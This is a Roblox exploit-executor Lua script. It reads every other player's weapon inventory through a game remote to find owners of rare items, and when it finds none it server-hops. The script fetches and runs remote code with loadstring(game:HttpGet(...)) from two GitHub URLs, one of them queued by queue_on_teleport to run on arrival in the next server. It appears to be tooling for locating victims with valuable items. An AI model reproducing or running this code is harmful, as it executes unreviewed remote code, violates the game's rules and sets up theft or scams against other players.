local ItemDB = require(game:GetService("ReplicatedStorage").Database.Sync.Item)
local Players = game:GetService("Players")
local Http = game:GetService("HttpService")
local preferably = {
    "ZombieBat", "Makeshift", "TravelerGun", "TreeGun2023Chroma", "Harvester", "Gingerscope", "TravelerAxe", "Celestial", "Icepiercer"
}
local function CheckInventoryForPlayer(player)
    local success, data = pcall(function()
        return game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(player)
    end)
    if success and data and data.Weapons and data.Weapons.Owned then
        local ownedItems = data.Weapons.Owned
        local foundItems = {}

        for _, itemName in ipairs(preferably) do
            if ownedItems[itemName] then
                table.insert(foundItems, itemName)
            end
        end
        if #foundItems > 0 then
            print("‚úÖ Found preferred items for player " .. player.Name)
            print("Items: " .. table.concat(foundItems, ", "))
            return true
        else
            print("‚ùå No preferred items found for player " .. player.Name)
        end
    else
        print("‚ùå Failed to get data for " .. player.Name)
    end
    return false
end

local function teleportToNewServer()
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local place_id = game.PlaceId
local job_id = game.JobId
local API = "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Desc&limit=100"
local request = loadstring(game:HttpGet("https://raw.githubusercontent.com/EpicPug/Stuff/main/request.lua"))()
	if request then
		local data
		local success, response
		local found_servers = {}

		success, response = pcall(function()
			data = request({Url = API:format(place_id)})
		end)

		if success and data and data.Body then
			local decode
			success, response = pcall(function()
				decode = HttpService:JSONDecode(data.Body)
			end)

			if success and decode and decode.data then
				for _, server in pairs(decode.data) do
					if type(server) == "table" and server.id ~= job_id then
						if server.playing >= 8 and server.playing < server.maxPlayers then
							table.insert(found_servers, server.id)
						end
					end
				end

				if #found_servers > 0 then
					local target_id = found_servers[1] -- –ø—Ä–æ—Å—Ç–æ –±–µ—Ä—ë–º –ø–µ—Ä–≤—ã–π –ø–æ–¥—Ö–æ–¥—è—â–∏–π

					TeleportService.TeleportInitFailed:Connect(function()
                          queue_on_teleport([[
wait(10)
loadstring(game:HttpGet('https://raw.githubusercontent.com/ipadys/empheriumf/refs/heads/main/f.txt'))()
    ]])
						TeleportService:TeleportToPlaceInstance(place_id, target_id, Players.LocalPlayer)
					end)

					repeat
						TeleportService:TeleportToPlaceInstance(place_id, target_id, Players.LocalPlayer)
						task.wait(2)
					until not game
				else
					warn("‚ùå –ü–æ–¥—Ö–æ–¥—è—â–∏–µ —Å–µ—Ä–≤–µ—Ä—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.")
				end
			else
				warn("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞—Ç—å JSON.")
			end
		else
			warn("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ —Å–µ—Ä–≤–µ—Ä–æ–≤.")
		end
	end

end

local isTeleporting = false

function KeepCheckingForValidPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        print("üéÆ Checking " .. player.Name)
        if CheckInventoryForPlayer(player) then
            print("üéâ Found a valid player!")
            return true
        end
    end

    if not isTeleporting then
        isTeleporting = true
        print("üîÅ No matches found, teleporting...")
        teleportToNewServer()
    end
    return false
end
while true do
    if KeepCheckingForValidPlayer() then
        break
    end
    wait(10)
end
